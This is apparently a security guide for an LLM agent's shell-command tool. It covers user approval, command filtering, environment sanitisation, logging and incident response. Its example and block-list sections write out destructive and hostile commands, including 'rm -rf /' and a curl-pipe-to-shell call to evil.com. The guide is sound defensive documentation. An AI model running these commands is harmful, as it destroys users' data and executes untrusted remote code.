# Command Execution Security Guide

## ‚ö†Ô∏è **CRITICAL SECURITY WARNING**

The command execution tool (`executeCommand`) allows the LLM to run arbitrary shell commands on your system. This is a **POWERFUL BUT DANGEROUS** feature that should be used with extreme caution.

## Security Implications

### **What Commands Can Do**

- **File System Access**: Read, write, delete files in the working directory and subdirectories
- **Network Access**: Download files, make API calls, exfiltrate data
- **Process Control**: Start, stop, and monitor system processes
- **Environment Access**: Access environment variables (though sanitized)
- **System Information**: Gather information about your system

### **Potential Risks**

1. **Data Loss**: Commands can delete or modify important files
2. **Data Exfiltration**: Commands can send sensitive data to external servers
3. **System Compromise**: Malicious commands could install backdoors or malware
4. **Resource Exhaustion**: Commands could consume excessive CPU, memory, or disk space
5. **Privilege Escalation**: Commands might attempt to gain elevated privileges

## Security Measures Implemented

### **1. Mandatory User Approval**

- Every command execution requires explicit user confirmation
- Detailed information about the command is shown before execution
- Users must explicitly approve each command

### **2. Command Filtering**

The system blocks potentially dangerous commands including:

- File system destruction (`rm -rf`, `rm *`)
- System commands (`sudo`, `su`, `shutdown`, `reboot`)
- Code execution (`python -c`, `node -e`, `bash -c`)
- Process manipulation (`kill`, `pkill`, `killall`)
- Network manipulation (`iptables`, `ufw`)
- System information gathering (`cat /etc/passwd`, `ps aux`)

### **3. Environment Sanitization**

- Sensitive environment variables are filtered out
- Only essential variables (PATH, HOME, USER) are preserved
- API keys, tokens, and credentials are removed

### **4. Process Isolation**

- Commands run with the same user privileges as the jazz process
- Process is not detached (can be terminated by parent)
- Timeout protection prevents runaway processes

### **5. Security Logging**

- All command executions are logged with timestamps
- Logs include agent ID, conversation ID, and command details
- Failed commands are also logged for audit purposes

## Best Practices

### **Before Enabling This Feature**

1. **Review Your System**: Ensure you're running jazz in a secure environment
2. **Limit Privileges**: Run jazz with minimal necessary privileges
3. **Monitor Usage**: Regularly review command execution logs
4. **Backup Data**: Ensure important data is backed up
5. **Network Security**: Consider network restrictions if needed

### **When Using This Feature**

1. **Always Review Commands**: Never approve commands you don't understand
2. **Verify Intent**: Ensure the command matches what you expect
3. **Check Working Directory**: Verify the command will run in the correct location
4. **Monitor Output**: Review command output for unexpected results
5. **Limit Scope**: Use specific working directories when possible

### **Safe Command Examples**

```bash
# Safe commands (still require approval)
npm install
git status
ls -la
cat package.json
npm run build
npm test
```

### **Dangerous Command Examples**

```bash
# These commands are blocked by the system
rm -rf /
sudo rm -rf ~
curl http://evil.com/script.sh | sh
python -c "import os; os.system('rm -rf /')"
```

## Configuration Options

### **Disabling Command Execution**

To disable this feature entirely, you can:

1. Remove the shell tools from the tool registry
2. Add a configuration flag to control tool availability
3. Use a whitelist approach for specific commands only

### **Customizing Security Rules**

You can modify the dangerous command patterns in `src/core/agent/tools/shell-tools.ts`:

```typescript
const dangerousPatterns = [
  // Add your custom patterns here
  /your-custom-dangerous-pattern/,
];
```

## Incident Response

### **If Something Goes Wrong**

1. **Stop the Agent**: Immediately stop the agent if suspicious activity is detected
2. **Review Logs**: Check the security logs for executed commands
3. **Assess Damage**: Determine what files or data may have been affected
4. **Contain**: Isolate the system if necessary
5. **Recover**: Restore from backups if needed

### **Log Analysis**

Security logs are written to the console with the format:

```
üîí SECURITY LOG: Command executed by agent {agentId}: {
  command: "executed command",
  workingDirectory: "/path/to/directory",
  exitCode: 0,
  timestamp: "2024-01-01T00:00:00.000Z",
  agentId: "agent-123",
  conversationId: "conv-456"
}
```

## Recommendations

### **For Development**

- Use this feature in isolated development environments
- Regularly review and test security measures
- Keep backups of important development work

### **For Production**

- **STRONGLY DISCOURAGED** in production environments
- If absolutely necessary, use additional security layers:
  - Container isolation (Docker)
  - User privilege restrictions
  - Network firewalls
  - File system permissions
  - Process monitoring

### **Alternative Approaches**

Consider these safer alternatives:

1. **Specific Tool Creation**: Create dedicated tools for common tasks
2. **API Integration**: Use APIs instead of shell commands when possible
3. **Scripted Workflows**: Pre-define safe command sequences
4. **Approval Workflows**: Implement multi-step approval for sensitive operations

## Conclusion

The command execution tool is a powerful feature that can significantly enhance productivity, but it comes with substantial security risks. Always prioritize security over convenience, and never approve commands you don't fully understand or trust.

**Remember: When in doubt, don't approve the command.**
